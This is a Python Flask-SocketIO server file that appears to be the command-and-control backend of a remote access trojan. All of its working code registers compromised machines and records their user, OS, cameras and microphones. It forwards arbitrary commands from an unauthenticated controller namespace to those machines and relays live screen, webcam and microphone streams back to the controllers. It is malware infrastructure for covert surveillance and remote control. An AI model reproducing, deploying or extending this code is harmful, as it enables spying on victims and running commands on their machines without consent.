# server.py
from flask import Flask, request
from flask_socketio import SocketIO, emit
import os

app = Flask(__name__)
app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY', 'change-this-in-render-env')
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')

clients = {}

class Client:
    def __init__(self, sid, ip, hostname, username, os_info, monitors, cameras, microphones):
        self.sid = sid
        self.ip = ip
        self.hostname = hostname
        self.username = username
        self.os_info = os_info
        self.monitors = monitors
        self.cameras = cameras
        self.microphones = microphones

# ============================================================================
# CLIENT NAMESPACE HANDLERS
# ============================================================================

@socketio.on('connect', namespace='/client')
def handle_client_connect():
    print(f"[+] Client connect attempt: {request.sid}")

@socketio.on('register', namespace='/client')
def handle_register(data):
    client = Client(
        sid=request.sid,
        ip=request.remote_addr,
        hostname=data.get('hostname', 'Unknown'),
        username=data.get('username', 'Unknown'),
        os_info=data.get('os_info', 'Unknown'),
        monitors=data.get('monitors', 1),
        cameras=data.get('cameras', []),
        microphones=data.get('microphones', [])
    )
    clients[request.sid] = client
    print(f"[+] Registered: {client.hostname} ({client.ip}) - {client.monitors}mon {len(client.cameras)}cam {len(client.microphones)}mic")
    
    # Notify all GUIs
    socketio.emit('new_client', {
        'sid': request.sid,
        'ip': client.ip,
        'hostname': client.hostname,
        'username': client.username,
        'os_info': client.os_info,
        'monitors': client.monitors,
        'cameras': client.cameras,
        'microphones': client.microphones
    }, namespace='/gui', broadcast=True)
    
    emit('registered', {'status': 'ok'})

@socketio.on('heartbeat', namespace='/client')
def handle_heartbeat():
    pass

@socketio.on('result', namespace='/client')
def handle_result(data):
    result = data.get('result', '')
    socketio.emit('command_result', {
        'sid': request.sid,
        'result': result
    }, namespace='/gui', broadcast=True)

@socketio.on('screen_frame', namespace='/client')
def handle_screen_frame(data):
    """Relay screen frame to all GUIs"""
    socketio.emit('screen_frame', {
        'sid': request.sid,
        'frame': data.get('frame'),
        'monitor': data.get('monitor', 0)
    }, namespace='/gui', broadcast=True)

@socketio.on('camera_frame', namespace='/client')
def handle_camera_frame(data):
    """Relay camera frame to all GUIs"""
    socketio.emit('camera_frame', {
        'sid': request.sid,
        'frame': data.get('frame'),
        'camera': data.get('camera', 0)
    }, namespace='/gui', broadcast=True)

@socketio.on('mic_audio', namespace='/client')
def handle_mic_audio(data):
    """Relay microphone audio to all GUIs"""
    socketio.emit('mic_audio', {
        'sid': request.sid,
        'audio': data.get('audio'),
        'mic': data.get('mic', 0)
    }, namespace='/gui', broadcast=True)

@socketio.on('disconnect', namespace='/client')
def handle_client_disconnect():
    if request.sid in clients:
        client = clients[request.sid]
        print(f"[-] Disconnected: {client.hostname}")
        del clients[request.sid]
        socketio.emit('client_left', {'sid': request.sid}, namespace='/gui', broadcast=True)

# ============================================================================
# GUI NAMESPACE HANDLERS
# ============================================================================

@socketio.on('connect', namespace='/gui')
def handle_gui_connect():
    print(f"[GUI] Controller connected")
    client_list = [{
        'sid': sid,
        'ip': c.ip,
        'hostname': c.hostname,
        'username': c.username,
        'os_info': c.os_info,
        'monitors': c.monitors,
        'cameras': c.cameras,
        'microphones': c.microphones
    } for sid, c in clients.items()]
    emit('client_list', {'clients': client_list})

@socketio.on('get_clients', namespace='/gui')
def handle_get_clients():
    client_list = [{
        'sid': sid,
        'ip': c.ip,
        'hostname': c.hostname,
        'username': c.username,
        'os_info': c.os_info,
        'monitors': c.monitors,
        'cameras': c.cameras,
        'microphones': c.microphones
    } for sid, c in clients.items()]
    emit('client_list', {'clients': client_list})

@socketio.on('send_command', namespace='/gui')
def handle_send_command(data):
    target_sid = data.get('sid')
    command = data.get('command')
    
    if target_sid in clients:
        print(f"[>] Command to {target_sid}: {command}")
        socketio.emit('execute', {'command': command}, room=target_sid, namespace='/client')
    else:
        emit('error', {'message': 'Client not found'})

@socketio.on('start_screen_stream', namespace='/gui')
def handle_gui_start_screen(data):
    target_sid = data.get('sid')
    monitor = data.get('monitor', 0)
    
    if target_sid in clients:
        print(f"[SCREEN] Starting stream from {target_sid} monitor {monitor}")
        socketio.emit('start_screen_stream', {'monitor': monitor}, room=target_sid, namespace='/client')

@socketio.on('stop_screen_stream', namespace='/gui')
def handle_gui_stop_screen(data):
    target_sid = data.get('sid')
    
    if target_sid in clients:
        print(f"[SCREEN] Stopping stream from {target_sid}")
        socketio.emit('stop_screen_stream', {}, room=target_sid, namespace='/client')

@socketio.on('change_monitor', namespace='/gui')
def handle_gui_change_monitor(data):
    target_sid = data.get('sid')
    monitor = data.get('monitor', 0)
    
    if target_sid in clients:
        socketio.emit('change_monitor', {'monitor': monitor}, room=target_sid, namespace='/client')

@socketio.on('start_camera_stream', namespace='/gui')
def handle_gui_start_camera(data):
    target_sid = data.get('sid')
    camera = data.get('camera', 0)
    
    if target_sid in clients:
        print(f"[CAMERA] Starting stream from {target_sid} camera {camera}")
        socketio.emit('start_camera_stream', {'camera': camera}, room=target_sid, namespace='/client')

@socketio.on('stop_camera_stream', namespace='/gui')
def handle_gui_stop_camera(data):
    target_sid = data.get('sid')
    
    if target_sid in clients:
        print(f"[CAMERA] Stopping stream from {target_sid}")
        socketio.emit('stop_camera_stream', {}, room=target_sid, namespace='/client')

@socketio.on('change_camera', namespace='/gui')
def handle_gui_change_camera(data):
    target_sid = data.get('sid')
    camera = data.get('camera', 0)
    
    if target_sid in clients:
        socketio.emit('change_camera', {'camera': camera}, room=target_sid, namespace='/client')

@socketio.on('start_mic_stream', namespace='/gui')
def handle_gui_start_mic(data):
    target_sid = data.get('sid')
    mic = data.get('mic', 0)
    
    if target_sid in clients:
        print(f"[MIC] Starting stream from {target_sid} mic {mic}")
        socketio.emit('start_mic_stream', {'mic': mic}, room=target_sid, namespace='/client')

@socketio.on('stop_mic_stream', namespace='/gui')
def handle_gui_stop_mic(data):
    target_sid = data.get('sid')
    
    if target_sid in clients:
        print(f"[MIC] Stopping stream from {target_sid}")
        socketio.emit('stop_mic_stream', {}, room=target_sid, namespace='/client')

@socketio.on('change_mic', namespace='/gui')
def handle_gui_change_mic(data):
    target_sid = data.get('sid')
    mic = data.get('mic', 0)
    
    if target_sid in clients:
        socketio.emit('change_mic', {'mic': mic}, room=target_sid, namespace='/client')

# ============================================================================
# HTTP ROUTES
# ============================================================================

@app.route('/')
def index():
    return "Server Running", 200

@app.route('/health')
def health():
    return {'status': 'ok', 'clients': len(clients)}, 200

@app.route('/ping')
def ping():
    return {'pong': True}, 200

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 10000))
    socketio.run(app, host='0.0.0.0', port=port, debug=False, allow_unsafe_werkzeug=True)
